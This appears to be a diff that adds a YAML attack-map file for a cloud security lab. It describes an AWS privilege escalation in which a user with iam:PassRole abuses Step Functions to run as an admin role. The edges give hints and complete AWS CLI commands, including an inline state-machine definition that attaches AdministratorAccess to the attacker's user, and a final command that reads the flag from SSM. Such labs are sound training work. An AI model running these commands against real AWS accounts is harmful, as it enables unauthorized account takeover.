@@ -1,0 +1,97 @@
+attackMap:
+  nodes:
+    - id: starting-user
+      label: "Starting User"
+      type: principal
+      subType: iam-user
+      arn: "arn:aws:iam::{account_id}:user/pl-prod-stepfunctions-001-to-admin-starting-user"
+      access:
+        type: assumed-breach-credentials
+      description: >
+        You have gained access to this principal's AWS IAM credentials. These could
+        have been obtained through many real-world vectors: phishing a developer,
+        compromising a CI/CD pipeline, discovering credentials in a public S3 bucket,
+        or finding them hardcoded in source code.
+
+        Regardless of how you obtained them, you are now operating as this principal.
+        This IAM user has iam:PassRole on a specific admin role plus
+        states:CreateStateMachine and states:StartExecution — enough to create a Step
+        Functions state machine whose inline ASL definition calls IAM APIs directly as
+        the passed admin role, without any container, Lambda function, or S3 bucket
+        required.
+
+    - id: admin-role
+      label: "Admin Role"
+      type: principal
+      subType: iam-role
+      isAdmin: true
+      arn: "arn:aws:iam::{account_id}:role/pl-prod-stepfunctions-001-to-admin-admin-role"
+      description: >
+        This IAM role has AdministratorAccess and trusts states.amazonaws.com. It is
+        passed as the execution role when creating the Step Functions state machine.
+        When the state machine executes, Step Functions assumes this role and uses its
+        credentials to call the AWS APIs specified in the state machine definition —
+        in this case iam:AttachUserPolicy, which grants the starting user full
+        administrative access.
+
+    - id: ctf-flag
+      label: "CTF Flag"
+      type: resource
+      subType: ssm-parameter
+      isTarget: true
+      arn: "arn:aws:ssm:{region}:{account_id}:parameter/pathfinding-labs/flags/stepfunctions-001-to-admin"
+      description: >
+        The CTF flag for this scenario, stored as an SSM parameter in the victim account.
+        Retrieving it requires administrator-equivalent permissions (ssm:GetParameter is
+        granted implicitly by AdministratorAccess). Your goal is to read this parameter
+        using the admin access gained from the previous step.
+
+  edges:
+    - from: starting-user
+      to: admin-role
+      label: "iam:PassRole + states:CreateStateMachine + states:StartExecution"
+      description: >
+        The starting user creates a Step Functions state machine, passing the admin role
+        as the execution role via iam:PassRole. The state machine's Amazon States Language
+        (ASL) definition contains a single Task state that calls the Step Functions AWS
+        SDK integration for iam:AttachUserPolicy, targeting the starting user with the
+        AdministratorAccess managed policy ARN. Executing the state machine causes Step
+        Functions to assume the admin role and call the IAM API directly — no container,
+        Lambda, or S3 bucket required. The attack completes in seconds.
+      hints:
+        - "Create a state machine using states:CreateStateMachine. Set --role-arn to the admin role ARN (iam:PassRole handles authorization). The --definition is inline ASL JSON — no S3 or Lambda needed."
+        - "The ASL definition should use a Task state with Resource set to arn:aws:states:::aws-sdk:iam:attachUserPolicy and Parameters specifying your UserName and PolicyArn (arn:aws:iam::aws:policy/AdministratorAccess)."
+        - "Start execution with states:StartExecution using the stateMachineArn from the create response. Poll states:DescribeExecution until status is SUCCEEDED (typically a few seconds). Then wait 15 seconds for IAM propagation."
+        - "Browse to https://pathfinding.cloud/paths/stepfunctions-001 for full technique details."
+      commands:
+        - description: "Check your current identity"
+          command: "aws sts get-caller-identity"
+        - description: "Create a Step Functions state machine with the admin role as execution role"
+          command: >
+            aws stepfunctions create-state-machine
+            --name pl-prod-stepfunctions-001-to-admin-privesc-sfn
+            --role-arn arn:aws:iam::{account_id}:role/pl-prod-stepfunctions-001-to-admin-admin-role
+            --type STANDARD
+            --definition '{"Comment":"Privesc via Step Functions SDK integration","StartAt":"AttachAdminPolicy","States":{"AttachAdminPolicy":{"Type":"Task","Resource":"arn:aws:states:::aws-sdk:iam:attachUserPolicy","Parameters":{"UserName":"pl-prod-stepfunctions-001-to-admin-starting-user","PolicyArn":"arn:aws:iam::aws:policy/AdministratorAccess"},"End":true}}}'
+        - description: "Start execution of the state machine"
+          command: "aws stepfunctions start-execution --state-machine-arn <stateMachineArn>"
+        - description: "Poll execution status until SUCCEEDED"
+          command: "aws stepfunctions describe-execution --execution-arn <executionArn> --query 'status' --output text"
+        - description: "Verify AdministratorAccess was attached to the starting user"
+          command: "aws iam list-attached-user-policies --user-name pl-prod-stepfunctions-001-to-admin-starting-user"
+
+    - from: admin-role
+      to: ctf-flag
+      label: "Read CTF flag"
+      description: >
+        With administrator-equivalent permissions now attached to the starting user,
+        retrieve the scenario flag from SSM Parameter Store. AdministratorAccess grants
+        ssm:GetParameter on all parameters in the account, so no additional permissions
+        are needed beyond the admin access just gained.
+      hints:
+        - "You now hold admin-equivalent credentials. The scenario flag is stored in an AWS service commonly used to hold configuration values and small secrets."
+        - "Scenario flags live under a shared prefix in SSM Parameter Store — consider what a reasonable naming convention for this lab might look like."
+        - "Use ssm:GetParameter with the full parameter name to retrieve the flag value."
+      commands:
+        - description: "Retrieve the CTF flag from SSM Parameter Store"
+          command: "aws ssm get-parameter --name /pathfinding-labs/flags/stepfunctions-001-to-admin --query 'Parameter.Value' --output text"
